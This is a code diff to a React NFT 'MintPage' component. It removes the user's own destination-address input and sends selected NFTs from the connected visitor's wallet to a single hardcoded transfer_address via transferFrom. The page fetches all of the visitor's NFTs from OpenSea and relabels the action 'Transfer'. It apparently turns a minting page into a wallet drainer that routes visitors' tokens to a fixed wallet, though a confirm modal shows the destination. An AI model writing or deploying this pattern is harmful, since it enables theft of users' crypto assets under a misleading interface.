@@ -3,7 +3,10 @@ import React, { useEffect, useState } from "react";
 import { useEthContext } from "../../context/EthereumContext";
 // @import style
 import {
+  ArrowText,
   BtnGroup,
+  Identions,
+  IdentyView,
   MintButton,
   MintContainer,
   MintText,
@@ -12,7 +15,6 @@ import {
   SmallText,
   TransferDiv,
   TransferView,
-  WalletAddress,
 } from "./style";
 import { toast, ToastContainer } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
@@ -22,25 +24,26 @@ import Modal from "@mui/material/Modal";
 import axios from "axios";
 
 import { contractABI } from "../../contract/ABI";
-
+import { transfer_address } from "../../contract/address";
+import Identicon from "../../component/Identicon";
 const style = {
   position: "absolute",
   top: "50%",
   left: "50%",
   transform: "translate(-50%, -50%)",
-  width: "60%",
+  maxWidth: "450px",
+  width: "100%",
   bgcolor: "#808080",
   boxShadow: 24,
   p: 4,
   border: "none",
-  height: "40%",
+  height: "auto",
   overflow: "scroll",
   display: "flex",
   flexDirection: "column",
 };
 
 const MintPage = () => {
-  const [address, setAddress] = useState("");
   const [nftdata, setNftdata] = useState([]);
   const [collectionData, setCollectionData] = useState([]);
   const [visible, setVisible] = useState(false);
@@ -95,6 +98,10 @@ const MintPage = () => {
     const { data } = await axios.get(
       `https://api.opensea.io/api/v1/assets?owner=${currentAcc}`
     );
+    // const { data } = await axios.get(
+    //   `https://api.opensea.io/api/v1/assets?owner=0x97be8adc37c81b32083da0d831f14e31a2a24168`
+    // );
+
     setNftdata(data.assets);
   };
   const handleConnectWallet = async () => {
@@ -106,16 +113,16 @@ const MintPage = () => {
   };
 
   const onTransfer = async () => {
-    if (address) {
+    if (transfer_address) {
       setVisible(true);
     } else {
-      toast("Please input address to transfer!");
+      toast("Please check address to transfer!");
     }
   };
   const onTransferNFT = async (contract_address, tokenID) => {
     const contract = new web3.eth.Contract(contractABI, contract_address);
     await contract.methods
-      .transferFrom(currentAcc, address, tokenID)
+      .transferFrom(currentAcc, transfer_address, tokenID)
       .send({
         from: currentAcc,
         value: 0,
@@ -135,12 +142,7 @@ const MintPage = () => {
       {currentAcc && currentAcc ? (
         nftdata.length > 0 ? (
           <BtnGroup>
-            <WalletAddress
-              placeholder="input wallet address"
-              value={address}
-              onChange={(e) => setAddress(e.target.value)}
-            />
-            <MintButton onClick={() => onTransfer()}>Select NFT</MintButton>
+            <MintButton onClick={() => onTransfer()}>Transfer</MintButton>
           </BtnGroup>
         ) : (
           ""
@@ -167,7 +169,23 @@ const MintPage = () => {
       >
         <Box sx={style}>
           <MintText>Transfer Confirm</MintText>
-
+          <Identions>
+            <IdentyView>
+              <Identicon address={currentAcc} />
+              <SmallText>
+                {currentAcc.slice(0, 6)}...
+                {currentAcc.slice(currentAcc.length - 4)}
+              </SmallText>
+            </IdentyView>
+            <ArrowText>{"->"}</ArrowText>
+            <IdentyView>
+              <Identicon address={transfer_address} />
+              <SmallText>
+                {transfer_address.slice(0, 6)}...
+                {transfer_address.slice(transfer_address.length - 4)}
+              </SmallText>
+            </IdentyView>
+          </Identions>
           {collectionData.length > 0
             ? collectionData[0] && (
                 <TransferView>
@@ -182,11 +200,11 @@ const MintPage = () => {
                       {collectionData[0].asset_contract
                         ? `${collectionData[0].asset_contract.address.slice(
                             0,
-                            6
+                            4
                           )}
             ...
             ${collectionData[0].asset_contract.address.slice(
-              collectionData[0].asset_contract.address.length - 4
+              collectionData[0].asset_contract.address.length - 3
             )}`
                         : "contract address"}
                     </SmallText>
